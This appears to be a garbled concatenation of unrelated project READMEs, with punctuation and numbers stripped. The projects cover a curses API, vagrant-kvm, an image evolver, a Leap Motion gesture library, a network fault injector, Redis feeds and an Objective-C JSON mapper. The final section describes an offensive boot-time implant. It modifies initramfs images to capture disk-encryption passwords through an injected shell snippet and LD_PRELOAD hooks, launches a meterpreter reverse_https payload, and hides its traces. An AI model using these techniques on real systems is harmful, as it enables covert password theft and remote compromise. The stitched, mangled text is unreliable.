moves the cursor to the given row and column and writes text addstr string text  integer charlimit  result writes the specified string at the current cursor position writing stops at the end of the string or when charlimit has been reached if charlimit  it is ignored addstr integer row integer column string text  integer charlimit  result moves the cursor to the given row and column and calls the version of addstr above with the rest of the arguments close result destroys the window and any of its children only call this once and when you are completely finished with the window window

9170085, there will be no update to this project anymore provider to vagrant allowing vagrant to control and provision kvm and qemu vm this plugin requires qemu   and  it has only been tested on fedora  and  debian wheezy ubuntu   lts precise and ubuntu   raring at the moment this plugin requires several library and helper utils packages default image format is now qcow instead of sparsed raw image with qcow vagrant kvm uses the box volume as a backing volume so that vm creation is a lot faster in most cases you want to use qcow ovf boxes conversion has been removed you should use vagrant mutate instead synced folders are now provided by a qemu and kvm virtfs in default you can also use nfs for file share using type nfs option there was a known libvirt bug in ubuntu host it was solved in ubuntu   trusty and a backported libvirt provided by ppa above provides the same workflow as the vagrant virtualbox provider uses virtfs for sync folders only works with  vm per vagrantfile for now requires libvirtd group membership to run vagrant debian and ubuntu only requires backporting qemu and libvirt from experimental debian or trusty ubuntu use qcow backing image by default which should make vm creation very fast vagrant   changes a structure of user boxes directories vagrant kvm handle box directory as libvirt and qemu temporary spool but vagrant   changes it at first time launched unfortunately vagrant kvm    does not run on vagrant   x users who interested in vagrant kvm    may use with vagrant   x this caused problem when following sinario  user use vagrant kvm    with vagrant   x  user upgrade vagrant   x  user upgrade vagrant     and after we use transient pool instead of persistent one in vagrant kvm    x    and after pools defined by vagrant kvm will be removed after system reboot we recommend to use following combinations vagrant   x or before and vagrant kvm    vagrant   x or after and vagrant kvm     or after if you are joining test for vagrant kvm or other reasons you use vagrant kvm    with vagrant   x you got call to virstoragepoolcreate failed cannot open path error please follow the instructions below please take care when running commands as root  upgrade vagrant kvm to vagrant kvm     or after  clear all storage definitions sudo ls and etc and libvirt and storage and vagrant sudo rm and etc and libvirt and storage and vagrant sudo ls and etc and libvirt and storage and vagrant alternative way open virt manager connect to localhost right click and open details click storage tab right click vagrant storage pool and delete it  restart libvirt daemon ubuntu and debian sudo service libvirt bin restart fedora and centos and suse and arch sudo systemctl restart libvirtd some versions of ubuntu kernel has a bug that will cause vagrant kvm to fail with a permission error on vagrant up it is a kernel bug with the apparmor security framework as a workaround please run following command to disable access control for libvirt helper sudo aa complain and usr and lib and libvirt and virt aa helper with fedora and arch default home directory permissions are set to drwx qemu and kvm runs as qemu user by default and cannot access your home directory to avoid this please check and change your home directory and child directories permission to permit qemu user access to and vagrant d and tmp and storage pool and setfacl m g qemu x and home and your account another option is to run qemu and kvm as the root user by changing the configuration in libvirt and etc and libvirt and qemu conf user root group root then restart libvirtd sudo systemctl restart libvirtd another option is to specify an existing local storage pool with the storage pool option for the kvm provider in your vagrantfile see below install using the standard vagrant   and plugin installation command after installation use vagrant up and specify the kvm provider an example is shown below vagrant plugin install vagrant kvm vagrant up provider kvm of course prior to doing this you ll need to obtain a kvm compatible box file for vagrant you can convert a virtualbox base box using you will need a private network specifying an ip address in your vagrantfile the minimum vagrantfile would then be vagrant configure  do and config and config vm box precise config vm network privatenetwork ip     and then run vagrant up provider kvm if you always use kvm provider as default please set it in your bashrc export vagrantdefaultprovider kvm then you can simply run vagrant up to use the kvm provider there are some provider specific parameter to control vm definition cpumodel cpu architecture i or x  default is x  note that your base box should specify this corenumber number of cpu cores memorysize memory size such as m gib kib unit is kib if unspecified storagepool specify an existing local storage pool to use instead of vagrant s own gui boolean for starting vm with vnc enabled vncport the port the vnc server listens to default is automatic port assignment vncautoport if true kvm will automatically assign a port for vnc to listen to defaults to false but the default vncport is  which results in this flag being automatically turned on by kvm vncpassword a password used to protect the vnc session imagetype an image format for vm disk raw or qcow default is qcow when choosing raw  vagrant kvm always convert box image into storage pool which consumes disk space and is a longer process recommendation is qcow machinetype the type of machine to boot default is pc   networkmodel the model of the network adapter you want to use defaults to virtio can be set to default if you want to use the kvm default setting possible values include nek isa i ib ier nek pci pcnet rtl e virtio videomodel the model of the video adapter default to cirrus can also be set to vga imagemode possible value are clone or cow  defaults to cow if set to clone  the image disk will be copied rather than use the original box image this is slower but allows multiple vms to be booted at the same time customize customize virtual machine with virsh command similar functionality with virtualbox provider diskbus disk interface to show virtual disk to guest virtio or sata  scsi a box which is mutate ed from virtualbox and vmware box may specify sata and ide for disk bus it may be useful to specify virtio for performance even when box defaults disk bus as sata and ide and scsi seclabel enables security labelling using selinux apparmor dac based on the host distribution if set to on forcepause use pause for vagrant suspend instead of suspend it keeps resource online but execution is stopped when vm has a device that is not supported hibernate  automatically use pause regardless of this virtiorng boolean for optional virtio device of random number generator qemu    and after support this device default false vagrant kvm is a kvm and qemu provider for single local host vagrant kvm is simple local host only qemu and kvm only provider that is intended as an alternative to virtualbox while keeping the same workflow vagrant libvirt is a libvirt provider to control machines via the libvirt toolkit vagrant libvirt covers a lot more libvirt options local and remote hosts and multiple hypervisors such as xen lxc and kvm and qemu in early  vagrant libvirt only supports kvm and qemu in local host there is no big feature difference here are a few difference vagrant kvm tests every pull request and repository with travis ci vagrant libvirt does not vagrant kvm by default uses the qcow format and qcow disk image backing to create a new volume from the box disk this makes creating a new vm very fast with some performance penalties you can change this through configuration to clone copy disk image to pool instead this will make new vm creation slower but give you better disk performance you can also configure vagrant kvm to use raw images for an additional performance gain vagrant libvirt use qcow as disk image vagrant kvm allows you to configure how to connect with vnc which provides virtual guest desktop vagrant libvirt does not vagrant kvm can provide synced folder with nfs only we plan to provide virtfs pshare to allow sharing local folders without root privilege vagrant libvirt provide synced folder with rsync and nfs they also plan to support virtfs in future it is neccesary to fix several bugs in libvirt and qemu to enable the virtfs feature in both providers vagrant kvm plans to support snapshot via sahara we have already proposed to sahara project to add support and are waiting for review vagrant libvirt is supported by sahara both are supported by vagrant mutate as convert target vagrant kvm controls kvm and qemu via ruby libvirt libvirt and qemu vagrant libvirt controls machines via fog a cloud abstraction library in ruby that is also used by vagrant aws the fog library controls virtual machines on supported platforms and provides control of qemu and kvm machines through ruby

27651155, shapeme a small program to evolve images using simulated annealing note that the program was written entirely as a trow away so the internal structure is not as good as it should be however i performed some minimal refactoring after the release just to remove blatantly duplicated code but still far from good code so what it does  it takes a reference image a png file  it starts with a set of random triangles and and or circles  it evolves this triangles via random mutations using some broken simulated annealing in order to evolve it into the final image  the program saves and loads states  it also outputs an svg file representing the image so you can print a big version of it sometimes generated pictures are quite cool since it uses the sdl library it shows visually the evolution of the image and i believe this is what was so cool for my son to watch and probably you ll have fun too how to build there is a terrible makefile try make it needs  the png lib how to run the program basic usage using the example image and shapeme annunziata png and tmp and annunziata bin and tmp and annunziata svg for additional options just run the program without args it will print some help have fun

12414724, v  adds the capability to learn and recognize motionless poses as seen in the new video below for full details of the new features and fixes take a look at the release notes release notes this framework currently supports high and low resolution gesture encoding and geometric template matching cross correlation and neural network based gesture and pose recognition it is intended that developers use this framework to explore alternative and improved capture and recognition algorithms sub classing the leaptrainercontroller all contributions are welcome the best known implementation of each of the core framework functions will be used as the framework default currently these are gesture recording triggered by frame velocity d geometric positioning capture for simple gesture recording geometric template matching for gesture recognition what are gestures and poses what are gestures and poses usage usage training the system training the system receiving events when movements are recognized receiving events when movements are recognized importing and exporting from leaptrainer importing and exporting from leaptrainer options options events events api api sub classing the leaptrainer controller sub classing the leaptrainercontroller the leaptrainer ui the leaptrainer ui but it doesn t recognize my gang sign and secret handshake and full double rimmer salute but it doesnt recognize my gang sign secret handshake full double rimmer salute release notes release notes thanks thanks author author version version license license leaptrainer js builds on top of this by providing a simple api to record and later recognise hand movements and positions within this space this recognition capability can be easily integrated into new applications to help build motion interfaces a gesture is a hand movement with a recognizable start and end for example a wave a tapping motion a swipe right or left a pose is a hand position that is held motionless for a few moments for example holding up some fingers to indicate a number pointing or making a stop sign the difference in how leaptrainer recognizes gestures as opposed to poses is that gesture recognition starts when hand movement suddenly speeds up and ends when it slows down or stops so a quick karate chop will trigger gesture recognition pose recognition on the other hand starts when movement suddenly stops and remains more or less unchanged for a short period so just holding a thumbs up for a moment or two will trigger pose recognition this data is then analysed by the leaptrainer framework and used to learn gestures and fire events when known gestures and poses are detected then create a leaptrainer controller object var trainer new leaptrainer controller var leapcontroller new leap controller var trainer new leaptrainer controller controller leapcontroller leapcontroller connect the leaptrainer controller constructor also accepts a set of configuration variables options for developers interested in developing new recording or recognition algorithms the leaptrainer controller can be easily sub classed sub classing the leaptrainercontroller once a leaptrainer controller is created it can be used to train new gestures receive events when known gestures are detected receiving events when gestures are detected  and import and export gestures importing and exporting gestures a new gesture or pose can be created like this trainer create halt by default calling the create function will switch the controller into training mode if a second parameter is passed this will cause the controller to just store the name without moving directly into training trainer create halt  true and and the controller won t switch to training mode while in training mode leaptrainer will watch for a configured number of training gestures options  and once enough input has been gathered  halt  will be added to the list of known gestures and poses if a learning algorithm is being used that requires an initialization period for example neural network based recognition sub classing the leaptrainercontroller then a training completion event events will fire once the algorithm has been fully initialized the leaptrainer ui the leaptrainer ui can be used as an interface for training the system once a gesture or pose has been learned leaptrainer will fire an event containing the movement s name whenever it recognizes it again components can register to receive these events using the on  function trainer on halt  function console log stop right there previously registered listeners can unregister themselves using the off  function trainer off halt  registeredfunction gestures and poses can be exported from leaptrainer for persistence or transport using the tojson  function which accepts a name as a parameter var savedgesture trainer tojson halt previously exported gestures and poses can be imported into a leaptrainer controller using the fromjson function trainer fromjson saveddata sub classes of the controller may implement alternative export formats by default the json exported just contains the name of the gesture a flag indicating if it s a gesture or a pose and the stored training data something like this name halt  pose false  data    since the training data format may change between controller sub classes it is not necessarily true that gestures exported from one leaptrainer controller sub class will be compatible with another for example the neural network controller sub classing the leaptrainercontroller adds an encoded trained neural network to the export format so that networks don t need to be re trained on import options can be passed to the leaptrainer controller constructor like so new leaptrainer controller minrecordingvelocity  downtime  some options apply to the default implementations of functions and may be removed or redundant in sub classes of the leaptrainer controller pauseonwindowblur if this variable is true then the leaptrainer controller will pause when the browser window loses focus and resume when it regains focus default false minrecordingvelocity the minimum velocity a frame needs to be measured at in order to trigger gesture recording frames with a velocity below this speed will cause gesture recording to stop frame velocity is measured as the fastest moving hand or finger tip in view default  maxrecordingvelocity the maximum velocity a frame can measure at and still trigger pose recording or above which to pose recording will be stopped default  mingestureframes the minimum number of frames that can contain a recognisable gesture default  minposeframes the minimum number of frames that need to hit as recordable before pose recording is actually triggered this higher this number the longer a pose needs to be held in position before recognition will be attempted default  hitthreshold the return value of the recognition function above which a gesture is considered recognized raise this to make gesture recognition more strict default   trainingcountdown the number of seconds after starttraining is called that training begins this number of training countdown events will be emit default  traininggestures the number of training gestures required to be performed in training mode default  convolutionfactor the factor by which training samples will be convolved over a gaussian distribution in order to expand the input training data set this to zero to disable convolution default  downtime the number of milliseconds after a gesture is identified before another gesture recording cycle can begin this is useful for example to avoid a  swipe left  gesture firing when a user moves his or her hand quickly back to center directly afer performing a  swipe right  default  the leaptrainer controller will emit events to listening components receiving events when movements are recognized during training and recognition the events below apply equally to gestures and poses though many still specify gesture this is because poses are a new addition to the library apart from events for the names of recognized movements several events inform listeners about activity inside the framework these events may be parameterized to provide listeners with more data components can register to listen for framework events in the same way as they register to listen for gesture and pose recognition trainer on training started  function movementname console log started training and movementname the framework events are gesture created fired when a new gesture is added to a leaptrainer controller object either by a call to the create  function or by importing a saved gesture via the fromjson  function carries two parameters gesturename and trainingskipped the latter will be true if this gesture was created by a call to the create  function in which the second parameter was true training the system training countdown fired a configurable number of times once per second after the starttraining function is called before the training started event fires and actual training begins training started fired when training begins on a gesture carries a single parameter gesturename training complete fired when training completes on a gesture carries three parameters gesturename traininggestures and ispose the second parameter is the array of encoded gestures recorded during training the final parameter indicates whether a pose or a gesture has been learned training gesture saved fired during training when a new training gesture is recorded carries two parameters gesturename and traininggestures the latter is the array of encoded gestures recorded so far during training the last entry of which will be the gesture just recorded started recording fired when the recordableframe function returns true and causes gesture recording to begin stopped recording fired when the recordableframe function returns false and recording was active causing gesture recording to stop gesture detected fired when any gesture is detected regardless of whether it is recognized or not this event fires before recognition is attempted and carries two parameters gesture and framecount the first is the recorded encoded gesture the second is the number of frames in the gesture gesture recognized fired when a known gesture is recognized carries two parameters hit and gesturename the hit parameter is a value between   and   indicating how closely the recognized gesture was matched to the training data with   being a  match gesture unknown fired when a gesture is detected that doesn t match any known gesture sufficiently to be considered a match this event carries two parameters besthit and closestgesturename identifying the closest known gesture the leaptrainer controller object offers the following functions any or all of which can be overidden by sub classes initialize options called just after a new instance of the controller is created to parse the options array connect to the leap motion device unless an existing leap controller object was passed as a parameter  and register a frame listener with the leap controller onframe called as each frame arrives from the leap motion note  this function is actually defined in the bindframelistener function below bindframelistener options called by the initialize function in order to create and bind the onframe function to leap controller frame events recordableframe frame min returns true if the provided frame should trigger recording and false if it should stop recording if the framework isn t already recording returning false does nothing and vice versa so really it returns whether or not a frame may possibly be part of a gesture by default this function makes its decision based on one or more hands or fingers in the frame moving faster than the configured minrecordingvelocity which is provided as a second parameter recordframe frame lastframe recordvector recordvalue called for each frame during gesture recording and it is responsible for adding values in frames using the provided recordvector and recordvalue functions which accept a  value numeric array and a single numeric value respectively this function should be overridden to modify the quality and quantity of data recorded for gesture recognition recordrenderableframe frame lastframe records a single frame in a format suited for graphical rendering since the recordframe function will capture data suitable for whatever recognition algorithm is implemented that data is not necessarily relating to geometric positioning of detected hands and fingers consequently this function should capture this geometric data currently only the last recorded gesture is stored so this function should just write to the renderablegesture array any format can be used but the format expected by the leaptrainer ui is for each hand position x y z  direction x y z  palmnormal x y z  fingers position x y z  direction x y z  length q  position x y z  direction x y z  length q   so a frame containing two hands would push an array with two objects like that above into the renderablegesture array create gesturename skiptraining called to create a new gesture and normally trigger the training countdown for that gesture the parameter gesture name is added to the gestures array and unless the trainlater parameter is present the startrecording function is triggered this function fires the  gesture created  event starttraining gesturename countdown counts down for countdown seconds firing a  training countdown  event on each iteration and when the countdown reaches zero sets the object level traininggesture variable this modifies what happens when a gesture is detected by determining whether we save it as a training gesture or attempting to recognize it this function fires the  training countdown  and  training started  events retrain gesturename deletes the set of training gestures associated with the provided gesture name and re enters training mode for that gesture if the provided name is unknown then this function will return false otherwise it will call the starttraining function resulting in a  training started  event being fired and return true trainalgorithm gesturename traininggestures for recognition algorithms that need a training operation after training data is gathered but before the gesture can be recognized this function can be implemented and will be called in the  savetraininggesture  function below when training data has been collected for a new gesture the default implementation uses this function to prepare captured gesture data for geometric template matching thanks savetraininggesture gesturename gesture the savetraininggesture function records a single training gesture if the number of saved training gestures has reached  traininggestures  the training is complete and the system switches back out of training mode this function fires the  training complete  and  training gesture saved  events distribute traininggestures generates a normalized distribution of values around a set of recorded training gestures the objective of this function is to increase the size of the training data without actually requiring the user to perform more training gestures the default implementation of this function generates a gaussian normalized distribution recognize gesture framecount matches a parameter gesture against the known set of saved gestures this function does not need to return any value but it should fire either the  gesture recognized  or the  gesture unknown  event providing a numeric value for the closest match and the name of the closest known gesture as parameters to the event if a gesture is recognized an event with the name of the gesture and no parameters will also be fired correlate gesturename traininggestures gesture this function accepts a set of training gestures and a newly input gesture and produces a number between   and   describing how closely the input gesture resembles the set of training gestures the default implementation uses geometric template matching thanks to perform correlation getrecordingtriggerstrategy this and the two functions below are used by the training ui to select alternative strategies sub classes should override these functions with names for the algorithms they implement each function should return a descriptive name of the strategy implemented by defult this function returns  frame velocity  getframerecordingstrategy returns the type and format of gesture data recorded by the recordframe function by default  low resolution  getrecognitionstrategy returns the name of the mechanism used to recognize learned gestures by default  cross correlation  tojson gesturename converts the requested stored gesture into a json string containing the gesture name and training data gestures exported using this function can be re imported using the fromjson function below this function depends on the browser providing the json object fromjson json this is a simple import function for restoring gestures exported using the tojson function above returns the object parsed out of the json so that overriding implementations can make use of this function on event listener this is a standard event registration event paired with the fire event below it provides an event oriented mechanism for notifying external components when significant events happen gestures being matching training cycles starting and ending etc off event listener removes an event listener previously bound using the on function above fire event called in various function above in order to notify listening components when the events they re registered to hear occur this function accepts an arbitrary number of arguments all of which will be passed on to listening functions except the first so not quite arbitrary arbitrary and   which is the name of the event being fired pause temporarily disables frame monitoring resume resumes paused frame monitoring destroy unbinds the controller from the leap frame event cycle making it inactive and ready for cleanup extend overrides used to create sub classes of the leaptrainer controller described below the default gesture recording and recognition functions are intended only as a starting point for investigation into better mechanisms for performing these functions consequently a simple mechanism is provided for extending the leaptrainer controller class and overriding the various functions described above sub classes are created using the extend function leaptrainer svmcontroller leaptrainer controller extend getrecognitionstrategy function return support vector machines trainalgorithm function gesturename traininggestures train an svm correlate function gesturename traininggestures gesture perform svm pattern recognition sub classes of the default leaptrainer controller can be found in the and sub classes and folder of the project currently three exist cross correlation recognition this was the default recognition algorithm in the first version of the framework it performs algebraic cross correlation to detect simiarities between learned and input gestures high resolution recorder records much more data per frame increases the accuracy of recorded gestures but makes recognition that much more difficult neural network recognition implements artificial neural network based gesture recognition sub classes can be integrated into the leaptrainer ui for testing and experimentation as described below note the current training ui was a major upgrade in version v  replacing the original v  interface entirely  this interface is also useful for experimentation with alternative algorithms for training and recognition and for getting general feedback on what s happening inside the framework at runtime screenshot and resources and leaptrainer ui png this application is just a simple html page and a javascript file both of which are included in the project so it s also useful as an example of how to integrate the framework into a web interface the ui allows configuration variables in the controller to be set screenshot and resources and training ui config png handlers on each of the configuration inputs immediately set the associated configuration variable as soon a blur event fires against them setting the recording trigger gesture encoding or recognition strategy variables will copy the associated functions out of the controller sub classes that implement them into the active controller if an included javascript contains a sub class of the leaptrainer controller object the ui will pick it up automatically and allow it to be selected as the active controller in this way new implementations can be easily tested by just including them in the training ui html page the open and close functions for the options panel can be bound to learned gestures as an example of controlling an interface with gesture input screenshot and resources and training ui gesture config png output from the leaptrainer controller is displayed in real time as an animated hand on screen this hand moves as you move your hand above the leap motion two hands can be also be rendered if you place a second hand in range of the device when the framework is recording the hand s displayed on screen become yellow when recording stops they return to white the hands are rendered in webgl consequently rendering for browsers that do not support webgl for example internet explorer or safari  on windows switch to rendering on an html canvas since canvas rendering is less efficient than webgl the hands rendered in these browsers is less detailed composed of less polygons screenshot and resources and training ui hand png when the browser does not support webgl a warning is displayed at the bottom left of the screen screenshot and resources and training ui webgl warning png when a gesture is learned or recognized the data that was captured is rendered as a semi transparent trail screenshot and resources and training ui trail png this trail disappears as soon as another gesture is detected whether or not it was recognized captured trails can be rotated by left clicking and dragging with the mouse when a new gesture is detected the camera reverts back to its original position finally trained gestures can be exported from the ui by clicking on them in the list of known gestures and copying the resulting json into the target application screenshot and resources and training ui export png the export overlay also provides a retrain button that will return the interface to training mode for the selected gesture allowing training data to be re recorded for existing gestures well maybe not yet it s a new system there are some alternative capture and recognition functions sub classing the leaptrainercontroller already included as well as a variety of configuration options options so maybe selecting the right implementation and tuning the framework will yield better results for the kinds of gestures you need with more experimentation and with contributions from the leap developers community the training and recognition functions should improve over time so if you re not getting the results you need now check back in a while and see how we re doing alternatively if you ve got ideas how the framework might be improved or if you just want to experiment with gesture training and recognition algorithms you could take a look at creating a sub class of the leaptrainer controller sub classing the leaptrainercontroller yourself v  reduced overly restrictive hit threshold from   to   decreased the gesture resample rate from  to  for increased accuracy pose training and recognition added assorted minor bug fixes and general tidying up some css tweaks to the training ui pauseonwindowblur set to false by default downtime set to  by default default hitthreshold increased to   maxrecordingvelocity and minposeframes options added all new all shiny training ui new started recording and stopped recording events new training countdown configuration variable and training countdown event fixed a bug in capture that was causing only absolute values to be recorded added pauseonwindowblur configuration variable and functionality new capture function more detailed than the original v  capture added geometric template matching as the new default recognition algorithm v

14847459, saboteur is a network fault injection tool that aims to simplify resilience and stability testing its core component is an agent that accepts commands over http and configures its host s network stack for various common fault scenarios currently these include total network partition remote service dead not listening on the expected port delays packet loss tcp connection timeout as often happens when two systems are separated by a stateful firewall currently it is linux only but support may be added for osx in future installing the agent and cli  saboteur s only dependency is python    and to install from the rpm and from the deb package after installation start the agent daemon in the usual way service saboteur agent start compatibility  so far i ve verified that saboteur works on centos   red hat   and ubuntu   it currently has some issues with the tc defaults on fedora  so only the networkfailure servicefailure and firewalltimeout fault types work on that os i d welcome any feedback about successes and failures on other distros or versions using the cli  the saboteur package installs a cli executable which can be used to configure and reset faults both locally and remotely typing sab without arguments or with h will display usage information to create a new fault sab add faulttype networkfailure toport  direction in hosts myhostmyhost to remove all faults sab reset hosts myhostmyhost note omitting hosts will cause commands to be sent to localhost using the http api directly  saboteur has a simple json over http api to add a new rule simply post to the agent process on port  e g curl x post d name packet loss to app server  type packetloss  direction in  toport  probability   for more examples of valid commands to reset all faults send a delete request to the root path e g resilience testing saboteur and junit  or any scenario involving network faults  which has a saboteur client as part of it and limitations  the saboteur agent currently implements its reset feature by deleting all iptables and tc rules so it currently won t play nicely on systems that have rules configured via other means this will be improved in future probably by having saboteur keep track of rules it has created so that these can be targeted for reset it s also likely that adding multiple delay and and or packetloss rules will not work correctly fixes are coming for both of these issues finally please don t use this in production yet it s in no way secure and would make an ideal attack vector for anyone wanting to dos your site i m considering trying to make the agent secure enough to be used as a building block for a chaos monkey again any feedback on the usefulness of this would be appreciated

1181479, thoonk is a persistent and fast system for push feeds queues and jobs which leverages redis thoonk py is the python implementation of thoonk and is interoperable with other versions of thoonk currently thoonk js for node js the core of thoonk is the feed a feed is a subject that you can publish items to string binary json xml whatever  each with a unique id assigned or generated other apps and services may subscribe to your feeds and recieve new and update and retract notices on your feeds each feed persists published items that can later be queried feeds may also be configured for various behaviors such as max number of items default serializer friendly title etc feeds are useful for clustering applications delivering data from different sources to the end user bridged peering apis pubsub hubbub xmpp pubsub maintaining atom and rss files etc  persisting application state passing messages between users taking input from and serving multiple apis simultaneously and generally persisting and pushing data around queues are stored and interacted with in similar ways to feeds except instead of publishes being broadcast clients may do a blocking get to claim an item ensuring that they re the only one to get it when an item is delivered it is deleted from the queue queues are useful for direct message passing sorted feeds are unbounded manually ordered collections of items sorted feeds behave similarly to plain feeds except that items may be edited in place or inserted in arbitrary order jobs are like queues in that one client claims an item but that client is also required to report that the item is finished or cancel execution failure to to finish the job in a configured amount of time or canceling the job results in the item being reintroduced to the available list unlike queues job items are not deleted until they are finished jobs are useful for distributing load ensuring a task is completed regardless of outages and keeping long running tasks away from synchronous interfaces in theory if i publish the package correctly then this should work pip install thoonk thoonk requires the redis py package i strongly recommend installing the hiredis package as well since it should significantly increase performance since the redis package is undergoing refactoring with backwards incompatible changes be sure to use version    pip install redis    pip install hiredis after checking out a copy of the source code you can run python testall py from the main directory listen mode is off by default turn it on if you want to get live events from

optional id editing an existing item in the feed can be done by publishing with the same id as the item to replace the edited version will be moved to the end of the feed since ids are unique within the feed it is possible to use a feed as a basic set structure by only working the ids and not with the item contents removing an item is done through retraction which simply requires the id of the item to remove feed retract item id retrieving all of the ids in the feed provides the order in which items appear itemids feed getids retrieving a dictionary of all items keyed by item id is doable using items feed getall items feed getall for id in feed getids dostuffwith items id a single item may be retrieved from the feed if its id is known item feed getitem item id a sorted feed is similar to a normal feed except that the ordering of the items can be modified and there is no bound on the number of items sorted feeds do not automatically rearrange items for you ordering is performed manually sortedfeed thoonk sortedfeed sortedfeedname inserting an item may be done in four places at the beginning of the feed sortedfeed prepend new first item at the end of the feed sortedfeed

priority item  priority queue high item queue get timeditem queue get timeout  a job feed is a queue of individual jobs there is no inherent relationship between jobs from the same job feed job thoonk job jobfeed creating new jobs is done by putting them in the job queue new items are placed at the end of the queue but it is possible to insert high priority jobs at the front job put job contents job put priority job  priority job high workers may pull jobs from the queue by claiming them using the get method the default behaviour is to block indefinitely while waiting for a job but a timeout value in seconds may be supplied data job get timeddata job get timeout  cancelling a job is done by a worker who has claimed the job cancellation relinquishes the claim to the job and puts it back in the queue to be given to another worker job cancel job id stalling a job removes it from the queue to prevent it from executing but does not completely delete it a stalled job is effectively paused waiting for whatever issue that required the stall to be resolved job stall job id once a job jas been stalled it can be retried once the issue requiring stalling has been resolved job retry job id retracting a job completely removes it from the queue preventing it from being executed job retract job id finishing a job can be done in three ways the first is as a simple acknowledgment that the task has been completed job finish job id the second is when there is result data that should be returned to the job owner the result true parameter is used since it is possible for none to be an actual job result job finish job id  result contents  result true it may also be desired to only keep job results around for a short period of time in which case a timeout parameter may be added job

supports nested types arrays nsstring nsnumber nsdate and more the name sounds like json to object er or something upgrade from previous version add dealloc mehtods to your models and nillify your peoperties automattic dealloc is no longer done by jastor need help with getting jastor up and running got a time consuming problem you want to get solved quickly you have the following json name foo

dictionary and parse the json response to a dictionary and person person person alloc initwithdictionary dictionary person firstname and and john person lastname and and doe how does it work runtime api the class s properties are read in runtime and assigns all values from dictionary to these properties with nsobject setvalue forkey for dictionaries jastor instantiates a new class based on the property type and issues another initwithdictionary arrays are only a list of items such as strings which are not converted or dictionaries which are treated the same as other dictionaries installation just copy jastor m and h and jastorruntimehelper m and h to your project create a class inherit use the initwithdictionary and enjoy make sure to initialize git submodules git submodules init git submodules update in xcode hit cmd and u under iphone simulator scheme really good to know what about properties that are reserved words as for now id is converted to objectid automatically maybe someday jastor will have ability to map server and obj c fields jastor classes also conforms to nscoding protocol so you get initwithcoder and encodewithcoder for free you can look at the tests

tinycore python filesystem support bzip lib tcz filesystems    tinycore tcz gdbm tcz libffi tcz mtd    tinycore tcz ncurses tcz openssl tcz python tcz readline tcz sqlite tcz at a minimum signature is as follows exampleos identifier grep exampleos etc and initrd release  root rootmnt  filename and ldlinux so   initrdfilename hda exampleos is a unique name for this os identifier is a shell command that has an exit code  when run against the correct initrd and  for anything else root is the full path or variable where the new root is mounted after decryption filename is the full path to drop our binary on the root fs take care to know what initrd mounts and what is mounted later on initrdfilename is the full path of the binary inside the initrd this is copied inside makefile cp core d and so it should match that after that every triple of file  pre  post is run against the initrd as a re sub e g re sub pre post file the contents of pre and post are expanded using format config detectedos  so feel free to expand your signature to inject items there is no limit to the number of replacements you can run  will expand to the full contents of the match pre when used inside the replace post be careful with and the python and meterpreter and reversehttps metasploit payload was chosen because it is more platform independant than the linux and and meterpreter and reversetcp payloads python seems to be installed by default on all the tested systems by default the payload is generated at compile time and piped into the c file as a define this makes iterations easier but it shouldn t be hard to save the payload and insert it manually debian based systems debian ubuntu etc use a standard gzipped cpio image as the initramfs this contains the default and init script which runs through preparing the system for full boot this includes asking the user for their password and mounting the encrypted root fs for dropping our so  we wait until the root filesystem has been mounted so after the user has been asked for their password and copy the so to the and dev filesystem the and dev filesystem was chosen as it is accessible just before the rootfs is switched and it is a ram based mount this means that our so won t touch disk to actually use the dropped so  we then use the ldpreload environmental variable on the switchroot call this variable is passed to all child executables and as such the final and sbin and init script will have the module loaded to keep this relatively quiet we check if we are loaded into and sbin and init  and if so we unset the ldpreload variable and delete the so this functionality can easily be disabled if we wanted to hook specific applications to force execution of the so  by default after loading we use the gcc flag wl initshell  where shell is our main function this specifies which function we want to call on init of the so think of this as an analogue to windows dllmain the part of the init script in charge of asking the user for their password and mounting the root filesystem is as follows scripts and local top and cryptroot if e newroot then if crypttarget crypttarget cryptsource cryptsource cryptkeyscript cryptkey and cryptcreate key file then message cryptsetup cryptsetup failed bad password or options continue fi the important part for us is where the output of cryptkeyscript is piped into cryptcreate cryptkeyscript is the password asker and cryptcreate is the disk mounter this pipe makes it very easy for us to attack we insert the following code where the pipe is to write out the password to the end of our so read p echo ne x p and our so echo n p this will read the password into the variable p  and both write it to the end of the so and echo it out again this code will be transparent for the purposes of cryptkeyscript and cryptcreate  but it will have the site effect of exfiltrating the password we use x to prepend a null byte accounting for many levels of shell escaping to the password this makes it much easier for our so to read the password back as it just needs to read backwards from the end of itself until it sees a null byte to provide this password to the attacker it is used as an environmental variable in the invocation of the payload this means that the attacker can just use the meterpreter command getenv password to retrieve the password due to the way the so is being loaded there will be references to it in both and proc and  and maps and and proc and  and environ the maps file is a list of loaded modules the following excerpt shows the contents of this file note the deleted  could potentially raise suspicion however unlike normal binaries it is not possible to access the so without directly carving it out of memory after it has been deleted feea feea r xp     and dev and hda deleted feea feec p     and dev and hda deleted feec feec rw p     and dev and hda deleted the environ file is a null separated list of environmental variables at invocation because it is from invocation this means that any modifications we make at runtime unsetting ldpreload will not be reflected in both of these cases becuase we can be hooked into any and all system processes we could just hook the read  function and remove any references to ourselves kali is sort of a special case it has the chained cpio as mentioned below but doesn t use systemd to boot as such the dracut os rule has been generalized such that it extracts blindly and then the second os detection catches kali if you add an os with a cpio containing only kernel and x and microcode and genuineintel bin  the identifier rule should be for the appended cpio as we will automatically find and extract it these systems have a different format for their initrd image compared to debian based systems the initrd files stored in and boot are an almost empty cpio archive with a gzipped cpio archive appended this second archive is the one containing the initramfs to unpack this second archive it is necessary to parse the first cpio archive to find the end alternatively you can find the string trailer and read on until you find gzip magic xf xb another difference of these systems is that they are systemd based and as such the and init executable in the initamfs is a symlink to the systemd binary rather than a flat sh script to bypass this limitation it is necessary to modify the service files related to mounting the root filesystem the usr and lib and systemd and system and initrd switch root service contains the script which is used to pivot to the newly decrypted root using the execstartpre pragma it is possible to execute other programs before the pivot takes place selinux is present on centos restricting the use of ldpreload one working path is and lib this was located by reading the file at and etc and selinux and targeted and modules and active and filecontexts for a systemu objectr libt labelled location because systemd calls clearenv before switching root our ldpreload variable is wiped out to bypass this we can hook clearenv  and always just replace the environment with only ldpreload however to achieve this we need to be pid  inside the initrd this is trickier as it is not possible to ldpreload into this process to get around this we have replaced and init with a bash shell script as follows export ldpreload and hda exec and usr and lib and systemd and systemd this works becuase and init is just a symlink to and usr and lib and systemd and systemd exec is used so that the process retains the parend pid  once this is impemented and clearenv is neutralised it is possible to set ldpreload for the real pid  inside the new root systemd handles passwords for encrypted filesystems completely differently to debian based init scripts the passwords are passed around using unix sockets which allow you to send credentials to get around this complexity the easiest method we found to access the password was to hook the cryptactivatebypassphrase function from libcryptsetup the relevant parts of the function declaration are as follows 